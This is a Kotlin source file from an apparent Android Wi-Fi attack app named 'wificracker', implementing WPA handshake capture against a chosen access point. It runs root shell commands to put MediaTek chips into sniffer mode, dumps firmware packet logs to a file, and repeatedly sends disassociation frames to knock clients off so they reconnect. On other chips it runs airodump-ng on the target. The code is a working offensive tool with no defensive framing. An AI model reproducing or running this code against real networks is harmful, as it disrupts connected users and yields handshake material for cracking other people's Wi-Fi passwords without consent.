package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import com.wificracker.core.wifi.ChipsetMonitorHelper
import com.wificracker.core.wifi.WifiChipVendor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class HandshakeCapture @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
    private val chipsetMonitorHelper: ChipsetMonitorHelper,
) : WifiAttack {
    companion object { private const val CAPTURE_DIR = "/data/local/tmp/wificracker/captures" }

    override fun execute(attack: Attack): Flow<String> = flow {
        shellExecutor.executeAsRoot("mkdir -p $CAPTURE_DIR")
        val chipInfo = chipsetMonitorHelper.detectChipVendor()

        if (chipInfo.vendor == WifiChipVendor.MEDIATEK && chipInfo.patchInstalled) {
            // MTK patched: ICS capture + deauth to force reconnect
            val captureFile = "$CAPTURE_DIR/hs_${attack.targetBssid.replace(":", "")}_${System.currentTimeMillis()}.ics"

            emit("[*] MTK ICS handshake capture for ${attack.targetBssid}")

            // 1. Enable ICS capture (promiscuous mode catches EAPOL)
            emit("[*] Enabling ICS capture + promiscuous mode...")
            shellExecutor.executeAsRoot("/data/local/tmp/wpa_driver \"SNIFFER 2 0 0 0 0 0 0 0 0 0\"")
            shellExecutor.executeAsRoot("/data/local/tmp/ics_enable 1")

            // 2. Start capture in background
            emit("[*] Capturing packets from /dev/fw_log_ics...")
            shellExecutor.executeAsRoot("cat /dev/fw_log_ics > $captureFile &")

            // 3. Send deauth to force client reconnection (triggers EAPOL handshake)
            emit("[*] Sending deauth to force reconnection...")
            for (i in 1..5) {
                shellExecutor.executeAsRoot("/data/local/tmp/wpa_driver \"AP_STA_DISASSOC Mac=${attack.targetBssid}\"")
                delay(500)
            }
            emit("[*] Deauth sent, waiting for handshake...")

            // 4. Wait for EAPOL packets (client reconnects)
            delay(15000)

            // 5. Stop capture
            shellExecutor.executeAsRoot("pkill -f 'cat /dev/fw_log_ics' 2>/dev/null")
            shellExecutor.executeAsRoot("/data/local/tmp/ics_enable 0")

            // Check capture size
            val sizeResult = shellExecutor.executeAsRoot("wc -c < $captureFile")
            val capturedBytes = sizeResult.stdout.trim().toLongOrNull() ?: 0
            emit("[+] Capture saved: $captureFile ($capturedBytes bytes)")

            if (capturedBytes > 1000) {
                emit("[+] Handshake likely captured! Check for EAPOL frames.")
            } else {
                emit("[!] Capture too small — client may not have reconnected")
            }
        } else {
            // Standard: airodump-ng (requires monitor mode + USB adapter)
            val outputPrefix = "$CAPTURE_DIR/hs_${attack.targetBssid.replace(":", "")}_${System.currentTimeMillis()}"
            val binary = binaryInstaller.getBinaryPath("airodump-ng")
            emit("[*] Capturing handshake for ${attack.targetBssid} via airodump-ng...")
            val cmd = "$binary --bssid ${attack.targetBssid} --write $outputPrefix --output-format pcap ${attack.interfaceName}"
            shellExecutor.executeAsRoot(cmd, timeoutSeconds = 120)
            emit("[+] Capture saved to $outputPrefix")
        }
    }.flowOn(Dispatchers.IO)

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f 'cat /dev/fw_log_ics' 2>/dev/null")
        shellExecutor.executeAsRoot("/data/local/tmp/ics_enable 0 2>/dev/null")
        shellExecutor.executeAsRoot("pkill -f 'airodump-ng.*${attack.targetBssid}' 2>/dev/null")
    }
}
